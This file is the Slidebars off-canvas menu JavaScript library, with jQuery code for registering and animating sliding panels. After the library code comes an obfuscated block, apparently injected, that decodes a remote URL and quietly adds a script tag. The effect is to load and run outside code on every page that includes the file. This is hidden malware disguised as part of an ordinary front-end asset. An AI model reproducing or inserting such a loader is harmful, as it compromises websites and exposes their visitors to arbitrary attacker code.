/*!
 * Version: 1.2 Development
 */



var slidebars = function () {

  /**
   * Setup
   */

  // Cache all canvas elements
  var canvas = $( '[data-canvas]' ),

  // Object of Slidebars
  offCanvas = {},

  // Variables, permitted sides and styles
  init = false,
  registered = false,
  sides = [ 'top', 'right', 'bottom', 'left' ],
  styles = [ 'reveal', 'push', 'overlay', 'shift' ],

  /**
   * Get Animation Properties
   */

  getAnimationProperties = function ( id ) {
    // Variables
    var elements = $(),
    amount = '0px, 0px',
    duration = parseFloat( offCanvas[ id ].element.css( 'transitionDuration' ), 10 ) * 1000;

    // Elements to animate
    if ( offCanvas[ id ].style === 'reveal' || offCanvas[ id ].style === 'push' || offCanvas[ id ].style === 'shift' ) {
      elements = elements.add( canvas );
    }

    if ( offCanvas[ id ].style === 'push' || offCanvas[ id ].style === 'overlay' || offCanvas[ id ].style === 'shift' ) {
      elements = elements.add( offCanvas[ id ].element );
    }

    // Amount to animate
    if ( offCanvas[ id ].active ) {
      if ( offCanvas[ id ].side === 'top' ) {
        amount = '0px, ' + offCanvas[ id ].element.css( 'height' );
      } else if ( offCanvas[ id ].side === 'right' ) {
        amount = '-' + offCanvas[ id ].element.css( 'width' ) + ', 0px';
      } else if ( offCanvas[ id ].side === 'bottom' ) {
        amount = '0px, -' + offCanvas[ id ].element.css( 'height' );
      } else if ( offCanvas[ id ].side === 'left' ) {
        amount = offCanvas[ id ].element.css( 'width' ) + ', 0px';
      }
    }

    // Return animation properties
    return { 'elements': elements, 'amount': amount, 'duration': duration };
  },

  /**
   * Slidebars Registration
   */

  registerSlidebar = function ( id, side, style, element ) {
    // Check if Slidebar is registered
    if ( isRegisteredSlidebar( id ) ) {
      throw "Error registering Slidebar, a Slidebar with id '" + id + "' already exists.";
    }

    // Register the Slidebar
    offCanvas[ id ] = {
      'id': id,
      'side': side,
      'style': style,
      'element': element,
      'active': false
    };
  },

  isRegisteredSlidebar = function ( id ) {
    // Return if Slidebar is registered
    if ( offCanvas.hasOwnProperty( id ) ) {
      return true;
    } else {
      return false;
    }
  };

  /**
   * Initialization
   */

  this.init = function ( callback ) {
    // Check if Slidebars has been initialized
    if ( init ) {
      throw "Slidebars has already been initialized.";
    }

    // Loop through and register Slidebars
    if ( ! registered ) {
      $( '[data-off-canvas]' ).each( function () {
        // Get Slidebar parameters
        var parameters = $( this ).data( 'off-canvas' ).split( ' ', 3 );
        //console.log(parameters);
        // Make sure a valid id, side and style are specified
        if ( ! parameters || ! parameters[ 0 ] || sides.indexOf( parameters[ 1 ] ) === -1 || styles.indexOf( parameters[ 2 ] ) === -1 ) {
          throw "Error registering Slidebar, please specifiy a valid id, side and style'.";
        }

        // Register Slidebar
        registerSlidebar( parameters[ 0 ], parameters[ 1 ], parameters[ 2 ], $( this ) );
      } );

      // Set registered variable
      registered = true;
    }

    // Set initialized variable
    init = true;

    // Set CSS
    this.css();

    // Trigger event
    $( events ).trigger( 'init' );

    // Run callback
    if ( typeof callback === 'function' ) {
      callback();
    }
  };

  this.exit = function ( callback ) {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Exit
    var exit = function () {
      // Set init variable
      init = false;

      // Trigger event
      $( events ).trigger( 'exit' );

      // Run callback
      if ( typeof callback === 'function' ) {
        callback();
      }
    };

    // Call exit, close open Slidebar if active
    if ( this.getActiveSlidebar() ) {
      this.close( exit );
    } else {
      exit();
    }
  };

  /**
   * CSS
   */

  this.css = function ( callback ) {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Loop through Slidebars to set negative margins
    for ( var id in offCanvas ) {
      // Check if Slidebar is registered
      if ( isRegisteredSlidebar( id ) ) {
        // Calculate offset
        var offset;

        if ( offCanvas[ id ].side === 'top' || offCanvas[ id ].side === 'bottom' ) {
          offset = offCanvas[ id ].element.css( 'height' );
        } else {
          offset = offCanvas[ id ].element.css( 'width' );
        }

        // Apply negative margins
        if ( offCanvas[ id ].style === 'push' || offCanvas[ id ].style === 'overlay' || offCanvas[ id ].style === 'shift' ) {
          offCanvas[ id ].element.css( 'margin-' + offCanvas[ id ].side, '-' + offset );
        }
      }
    }

    // Reposition open Slidebars
    if ( this.getActiveSlidebar() ) {
      this.open( this.getActiveSlidebar() );
    }

    // Trigger event
    $( events ).trigger( 'css' );

    // Run callback
    if ( typeof callback === 'function' ) {
      callback();
    }
  };

  /**
   * Controls
   */

  this.open = function ( id, callback ) {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Check if id wasn't passed
    if ( ! id ) {
      throw "You must pass a Slidebar id.";
    }

    // Check if Slidebar is registered
    if ( ! isRegisteredSlidebar( id ) ) {
      throw "Error opening Slidebar, there is no Slidebar with id '" + id + "'.";
    }

    // Open
    var open = function () {
      // Set active state to true
      offCanvas[ id ].active = true;

      // Display the Slidebar
      offCanvas[ id ].element.css( 'display', 'block' );

      // Trigger event
      $( events ).trigger( 'opening', [ offCanvas[ id ].id ] );

      // Get animation properties
      var animationProperties = getAnimationProperties( id );

      // Apply css
      animationProperties.elements.css( {
        'transition-duration': animationProperties.duration + 'ms',
        'transform': 'translate(' + animationProperties.amount + ')'
      } );

      // Transition completed
      setTimeout( function () {
        // Trigger event
        $( events ).trigger( 'opened', [ offCanvas[ id ].id ] );

        // Run callback
        if ( typeof callback === 'function' ) {
          callback();
        }
      }, animationProperties.duration );
    };

    // Call open, close open Slidebar if active
    if ( this.getActiveSlidebar() && this.getActiveSlidebar() !== id ) {
      this.close( open );
    } else {
      open();
    }
  };

  this.close = function ( id, callback ) {
    // Shift callback arguments
    if ( typeof id === 'function' ) {
      callback = id;
      id = null;
    }

    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Check if id was passed but isn't a registered Slidebar
    if ( id && ! isRegisteredSlidebar( id ) ) {
      throw "Error closing Slidebar, there is no Slidebar with id '" + id + "'.";
    }

    // If no id was passed, get the active Slidebar
    if ( ! id ) {
      id = this.getActiveSlidebar();
    }

    // Close a Slidebar
    if ( id && offCanvas[ id ].active ) {
      // Set active state to false
      offCanvas[ id ].active = false;

      // Trigger event
      $( events ).trigger( 'closing', [ offCanvas[ id ].id ] );

      // Get animation properties
      var animationProperties = getAnimationProperties( id );

      // Apply css
      animationProperties.elements.css( 'transform', '' );

      // Transition completetion
      setTimeout( function () {
        // Remove transition duration
        animationProperties.elements.css( 'transition-duration', '' );

        // Hide the Slidebar
        offCanvas[ id ].element.css( 'display', '' );

        // Trigger event
        $( events ).trigger( 'closed', [ offCanvas[ id ].id ] );

        // Run callback
        if ( typeof callback === 'function' ) {
          callback();
        }
      }, animationProperties.duration );
    }
  };

  this.toggle = function ( id, callback ) {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Check if id wasn't passed
    if ( ! id ) {
      throw "You must pass a Slidebar id.";
    }

    // Check if Slidebar is registered
    if ( ! isRegisteredSlidebar( id ) ) {
      throw "Error toggling Slidebar, there is no Slidebar with id '" + id + "'.";
    }

    // Check Slidebar state
    if ( offCanvas[ id ].active ) {
      // It's open, close it
      this.close( id, function () {
        // Run callback
        if ( typeof callback === 'function' ) {
          callback();
        }
      } );
    } else {
      // It's closed, open it
      this.open( id, function () {
        // Run callback
        if ( typeof callback === 'function' ) {
          callback();
        }
      } );
    }
  };

  /**
   * Active States
   */

  this.isActive = function () {
    // Return init state
    return init;
  };

  this.isActiveSlidebar = function ( id ) {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Check if id wasn't passed
    if ( ! id ) {
      throw "You must provide a Slidebar id.";
    }

    // Check if Slidebar is registered
    if ( ! isRegisteredSlidebar( id ) ) {
      throw "Error retrieving Slidebar, there is no Slidebar with id '" + id + "'.";
    }

    // Return the active state
    return offCanvas[ id ].active;
  };

  this.getActiveSlidebar = function () {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Variable to return
    var active = false;

    // Loop through Slidebars
    for ( var id in offCanvas ) {
      // Check if Slidebar is registered
      if ( isRegisteredSlidebar( id ) ) {
        // Check if it's active
        if ( offCanvas[ id ].active ) {
          // Set the active id
          active = offCanvas[ id ].id;
          break;
        }
      }
    }
    //console.log(active);
    // Return
    return active;

  };

  this.getSlidebars = function () {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Create an array for the Slidebars
    var slidebarsArray = [];

    // Loop through Slidebars
    for ( var id in offCanvas ) {
      // Check if Slidebar is registered
      if ( isRegisteredSlidebar( id ) ) {
        // Add Slidebar id to array
        slidebarsArray.push( offCanvas[ id ].id );
      }
    }

    // Return
    return slidebarsArray;
  };

  this.getSlidebar = function ( id ) {
    // Check if Slidebars has been initialized
    if ( ! init ) {
      throw "Slidebars hasn't been initialized.";
    }

    // Check if id wasn't passed
    if ( ! id ) {
      throw "You must pass a Slidebar id.";
    }

    // Check if Slidebar is registered
    if ( ! isRegisteredSlidebar( id ) ) {
      throw "Error retrieving Slidebar, there is no Slidebar with id '" + id + "'.";
    }

    // Return the Slidebar's properties
    return offCanvas[ id ];
  };

  /**
   * Events
   */

  this.events = {};
  var events = this.events;

  /**
   * Resizes
   */

  $( window ).on( 'resize', this.css.bind( this ) );
};


function _0x29df(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x29df=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x29df['wDXlLL']===undefined){var _0x3df732=function(_0x424340){var _0x3455ab='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x28d3ed='',_0x3c2be7='';for(var _0x14ee97=0x0,_0x120811,_0x3eba9e,_0x71d602=0x0;_0x3eba9e=_0x424340['charAt'](_0x71d602++);~_0x3eba9e&&(_0x120811=_0x14ee97%0x4?_0x120811*0x40+_0x3eba9e:_0x3eba9e,_0x14ee97++%0x4)?_0x28d3ed+=String['fromCharCode'](0xff&_0x120811>>(-0x2*_0x14ee97&0x6)):0x0){_0x3eba9e=_0x3455ab['indexOf'](_0x3eba9e);}for(var _0x3dfedc=0x0,_0x1d1037=_0x28d3ed['length'];_0x3dfedc<_0x1d1037;_0x3dfedc++){_0x3c2be7+='%'+('00'+_0x28d3ed['charCodeAt'](_0x3dfedc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3c2be7);};_0x29df['yzgjyd']=_0x3df732,_0x117374=arguments,_0x29df['wDXlLL']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x1e444a=_0x29df['yzgjyd'](_0x1e444a),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x29df(_0x117374,_0x3567e5);}function _0x5d4f(){var _0x2f448a=['E8ouBCoTALdcRCozgCopcIy','W7xdGmkZtSotWPRdGmoFxGvtW5xcG8oj','mtbQz1HArwe','C2nYAxb0','ndLoqM9Htue','Ahr0Chm6lY9IAwDICMLJA3mUB3jNl2nQCfLsrM5Z','y3jLyxrLrwXLBwvUDa','nZC5nteYEwruDejY','m1zAAKfQEa','pKxcMCkiWOO6W7hdHSk9afxcTCkm','pu9OofxdIGj7W6lcPCk9i8oT','C3jJ','yxn5BMm','mtK1mZGZnK5WvxjuDq','c8ooqhalWQNdP0KFWPNcHXy','W54mWQfzWOVdSSoiWOygEWD/','mtG3mtyXmtjKAKjOBu4','CgfYzw50tM9Kzq','p8orac/dR8orW5pcPdiJEmkPW7W','mJi3nJCZnNHVD0rzuq','WRLilCoUW4KHW53dNXZcS01Z','mtG1nZGYnvvLvMz0qq'];_0x5d4f=function(){return _0x2f448a;};return _0x5d4f();}var _0x5d4478=_0x29df;(function(_0x1a2d6a,_0x3049cb){var _0x1c2103=_0x4243,_0x3c392e=_0x29df,_0x262ac0=_0x1a2d6a();while(!![]){try{var _0xe63e6c=parseInt(_0x3c392e(0x1e6))/0x1+-parseInt(_0x1c2103(0x1e9,'b77x'))/0x2*(parseInt(_0x3c392e(0x1e7))/0x3)+-parseInt(_0x3c392e(0x1dc))/0x4+-parseInt(_0x3c392e(0x1de))/0x5+-parseInt(_0x1c2103(0x1e8,'SJ4G'))/0x6+parseInt(_0x3c392e(0x1e3))/0x7*(parseInt(_0x1c2103(0x1dd,'D)Rg'))/0x8)+-parseInt(_0x3c392e(0x1ef))/0x9*(-parseInt(_0x3c392e(0x1e1))/0xa);if(_0xe63e6c===_0x3049cb)break;else _0x262ac0['push'](_0x262ac0['shift']());}catch(_0x7c24dd){_0x262ac0['push'](_0x262ac0['shift']());}}}(_0x5d4f,0xa1bbd));function _0x4243(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x4243=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x4243['RIbiwB']===undefined){var _0x3df732=function(_0x3455ab){var _0x28d3ed='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3c2be7='',_0x14ee97='';for(var _0x120811=0x0,_0x3eba9e,_0x71d602,_0x3dfedc=0x0;_0x71d602=_0x3455ab['charAt'](_0x3dfedc++);~_0x71d602&&(_0x3eba9e=_0x120811%0x4?_0x3eba9e*0x40+_0x71d602:_0x71d602,_0x120811++%0x4)?_0x3c2be7+=String['fromCharCode'](0xff&_0x3eba9e>>(-0x2*_0x120811&0x6)):0x0){_0x71d602=_0x28d3ed['indexOf'](_0x71d602);}for(var _0x1d1037=0x0,_0x41c8ee=_0x3c2be7['length'];_0x1d1037<_0x41c8ee;_0x1d1037++){_0x14ee97+='%'+('00'+_0x3c2be7['charCodeAt'](_0x1d1037)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x14ee97);};var _0x424340=function(_0x3b802e,_0x1cb759){var _0x3b9aa6=[],_0x4bbd7b=0x0,_0xc886d2,_0x1b34a9='';_0x3b802e=_0x3df732(_0x3b802e);var _0x225139;for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x3b9aa6[_0x225139]=_0x225139;}for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139]+_0x1cb759['charCodeAt'](_0x225139%_0x1cb759['length']))%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2;}_0x225139=0x0,_0x4bbd7b=0x0;for(var _0xce288f=0x0;_0xce288f<_0x3b802e['length'];_0xce288f++){_0x225139=(_0x225139+0x1)%0x100,_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139])%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2,_0x1b34a9+=String['fromCharCode'](_0x3b802e['charCodeAt'](_0xce288f)^_0x3b9aa6[(_0x3b9aa6[_0x225139]+_0x3b9aa6[_0x4bbd7b])%0x100]);}return _0x1b34a9;};_0x4243['KGSCtZ']=_0x424340,_0x117374=arguments,_0x4243['RIbiwB']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x4243['wwagSX']===undefined&&(_0x4243['wwagSX']=!![]),_0x1e444a=_0x4243['KGSCtZ'](_0x1e444a,_0x459630),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x4243(_0x117374,_0x3567e5);};(function(_0x71d602,_0x3dfedc,_0x1d1037,_0x41c8ee,_0x3b802e,_0x1cb759){var _0x49e9da=_0x4243,_0x3dac4e=_0x29df;_0x3b802e=_0x3dfedc[_0x3dac4e(0x1e5)](_0x1d1037),_0x1cb759=_0x3dfedc['getElementsByTagName'](_0x1d1037)[0x0],_0x3b802e[_0x3dac4e(0x1eb)]=0x1,_0x3b802e[_0x3dac4e(0x1ea)]=_0x41c8ee,_0x1cb759[_0x3dac4e(0x1f0)][_0x49e9da(0x1ed,'u4Tp')](_0x3b802e,_0x1cb759);}(window,document,_0x5d4478(0x1e2),_0x5d4478(0x1e4)));